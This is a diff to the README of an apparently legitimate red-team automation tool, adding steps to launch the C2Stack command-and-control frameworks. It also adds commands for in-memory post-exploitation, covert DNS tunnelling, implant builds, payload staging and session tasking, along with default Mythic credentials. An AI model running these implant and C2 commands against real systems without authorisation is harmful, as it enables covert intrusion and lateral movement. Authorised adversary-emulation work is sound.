@@ -274,24 +274,60 @@ export REDSTRIKE_WS01_SSH_KEY="/path/to/private-key"
 
 ## Step 7 (Optional) — C2-Enabled Mode with C2Stack
 
-For in-memory post-exploitation, lateral movement, and covert egress without dropping binaries to disk, RedStrike natively integrates with **[C2Stack](https://github.com/Ganron007/C2Stack)**.
+For in-memory post-exploitation, lateral movement, and covert egress without dropping binaries to disk, RedStrike natively integrates with **[C2Stack](https://github.com/Ganron007/C2Stack)** across all five of its frameworks: **Sliver** (v1.7.7), **Meridian**, **Mythic** (Apollo), **Havoc**, and **Adaptix**.
 
 ### 1. Launch C2Stack
-Clone and start the C2 teamservers (Docker-based):
+Clone and start the C2 teamservers (Docker-based; the bootstrap copies `.env.example` → `.env`, builds the images, and starts the stack):
 ```bash
 git clone https://github.com/Ganron007/C2Stack.git
 cd C2Stack/Docker
-docker compose up -d sliver meridian
+./docker-bootstrap.ps1          # Windows: redirector + meridian + sliver + havoc
+./docker-bootstrap.ps1 -All     # all five frameworks (Mythic pulls, Adaptix builds ~5 min)
+# Linux/macOS: ./docker-bootstrap.sh [--all]
 ```
 
 ### 2. Run RedStrike in C2 Mode
 ```bash
 # Sliver in-memory .NET assembly execution (Rubeus, SharpHound, Seatbelt)
+#   requires sliver-client on PATH with the C2Stack operator config imported
 redstrike graph run --phase 1-3 --c2 --c2-backend sliver --c2-session <sliver-session-id>
 
-# Meridian covert DNS TXT tunneling & HTTP client
-redstrike graph run --phase 1-3 --c2 --c2-backend meridian --c2-endpoint http://127.0.0.1:8080
+# Meridian covert DNS TXT tunneling & HTTP (driven through its container CLI)
+redstrike graph run --phase 1-3 --c2 --c2-backend meridian \
+  --c2-endpoint "docker exec -i c2stack-meridian-1 meridian"
+
+# Mythic (Apollo agents) via REST webhooks on the published UI port (7443 -> 17443);
+# set MYTHIC_USERNAME / MYTHIC_PASSWORD (defaults mythic_admin / mythic)
+redstrike graph run --phase 1-3 --c2 --c2-backend mythic --c2-session <callback-id> \
+  --c2-endpoint http://127.0.0.1:7443
+
+# Havoc & Adaptix have no direct operator REST API — RedStrike drives them through
+# C2Stack's Flight Control portal (http://127.0.0.1:8000, override with C2STACK_PORTAL_URL)
+redstrike graph run --phase 1-3 --c2 --c2-backend havoc  --c2-endpoint http://127.0.0.1:8000
+redstrike graph run --phase 1-3 --c2 --c2-backend adaptix --c2-endpoint http://127.0.0.1:8000
 ```
+
+Notes:
+- The Flight Control portal also exposes a unified live session table (`GET /api/ops/sessions`) across all five frameworks — handy for discovering session ids before tasking.
+- Havoc in-memory .NET execution (`dotnet`) requires the assembly staged inside the portal container first: `docker cp <assembly> c2stack-portal-1:/tmp/`.
+- Mythic task output is read from Mythic's `response` table via the `c2stack-mythic_postgres-1` container; `psexec`-style movement on Apollo is intentionally rejected (use `shell` + `sc.exe` or `wmiexecute`).
+
+### 3. Build, stage, and inspect the stack (`redstrike c2`)
+
+RedStrike drives the whole C2Stack lifecycle through its Flight Control API — implant builds, file staging, fleet view, and redirector checks:
+
+```bash
+redstrike c2 status                                        # container health
+redstrike c2 sessions                                      # unified fleet (all frameworks)
+redstrike c2 build --backend sliver --retrieve --out ./impl.exe
+redstrike c2 build --backend havoc --out ./demon.exe
+redstrike c2 build --backend adaptix --listener cadre_http --out ./beacon.exe
+redstrike c2 build --backend mythic --out ./apollo.exe     # async: polled then downloaded
+redstrike c2 stage ./payload.o                             # Mythic agent_file_id for COFF/assembly tasking
+redstrike c2 task --backend havoc --session <id> --command "whoami"
+```
+
+`--c2` runs can also self-configure: omitting `--c2-session` auto-selects the first live session for the chosen backend, and `--c2-backend auto` picks the first framework in preference order (sliver → havoc → adaptix → mythic → meridian) that has a live session.
 
 ---
 
